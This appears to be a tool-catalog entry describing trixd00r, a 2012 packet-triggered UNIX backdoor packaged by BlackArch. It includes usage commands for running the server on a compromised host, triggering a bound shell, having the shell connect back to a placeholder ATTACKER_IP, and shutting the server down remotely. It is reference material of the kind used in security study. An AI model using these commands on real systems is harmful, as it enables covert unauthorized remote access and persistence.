---
name: "trixd00r"
categories:
  - blackarch-backdoor
version: "0.0.1"
homepage: "http://nullsecurity.net/tools/backdoor.html"
packaged-by: [blackarch]
blackarch-builddate: "2015-09-06"
build-system: make
license: custom:unknown
meta-checked: "2026-11-09"
github-repo: "nullsecuritynet/tools"
github-stars: 70
github-pushed: "2026-10-13"
github-archived: false
github-issues: 2
github-match: "exact"
gh-checked: "2026-11-09"
worth: 6.6
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 36
gh-activity-checked: "2026-11-09"
---

# trixd00r

> An advanced and invisible userland backdoor based on TCP/IP for UNIX systems — a passive pcap sniffer wakes on a magic packet, then binds or connects back a shell.

*No corpus evidence — derived from the packaged source (release tarball in the [nullsecuritynet tools collection](https://github.com/nullsecuritynet/tools) under `backdoor/trixd00r`, which the frontmatter links). Beware same-named GitHub repos that are unrelated one-file mirrors of this 2012 tool.*

## What it's for

A 2012 client/server backdoor from the Null Security team (author noptrix). The server, `trixd00rd`, is deliberately passive: it opens no listening port but sniffs an interface with libpcap, waiting for a "magic packet" carrying a secret payload — nothing shows up in a port scan or `netstat` while it idles. When the client, `trixd00r`, sends the magic packet, the server serves a shell, either binding it over TCP or UDP or connecting back to the client, again over TCP or UDP. This is not an exploitation tool — it is installed after access exists, and its value is the sniff-based trigger. Know its age: last release 0.0.1 (2012), C against libpcap, and modern endpoint detection makes it chiefly interesting as a reference design for packet-triggered backdoors.

## Typical use cases

### Run the server on a compromised host

```
./trixd00rd -i eth0
```

Outcome: sniffs `eth0` for the default trigger — TCP SYN magic packets whose payload is the default `opensesame` string — and, when one arrives, binds a shell on the default TCP port 31337 (`-b` to change). While idle, no port is open. Restrict who may trigger it with `-a <host>`, and change the trigger payload with `-p <string>`.

### Trigger the shell from the client

```
./trixd00r -h target.example.com
```

Outcome: sends the default TCP SYN magic packet with the default payload to `target.example.com`; the server binds its shell on 31337 and the client connects to it, dropping you into a shell. `-p <port>` overrides the port if the server was started with a non-default `-b`.

### Have the shell connect back instead of binding

```
./trixd00rd -i eth0 -c ATTACKER_IP -p s3cr3t
```

Outcome: on receiving a magic packet carrying `s3cr3t`, the server connects its shell back out to `ATTACKER_IP` over TCP or UDP instead of binding a local port — useful when inbound connections to the host are filtered. Run the client in one of its listen shell modes (list them with `-s ?`) to receive it; `-t ?` on either binary lists the available magic-packet types.

### Tear the server down remotely

```
./trixd00r -h target.example.com -m byebye
```

Outcome: sends the default quit payload (`-z` on the server, default `byebye`), which makes the running `trixd00rd` exit — clean removal without touching the shell.
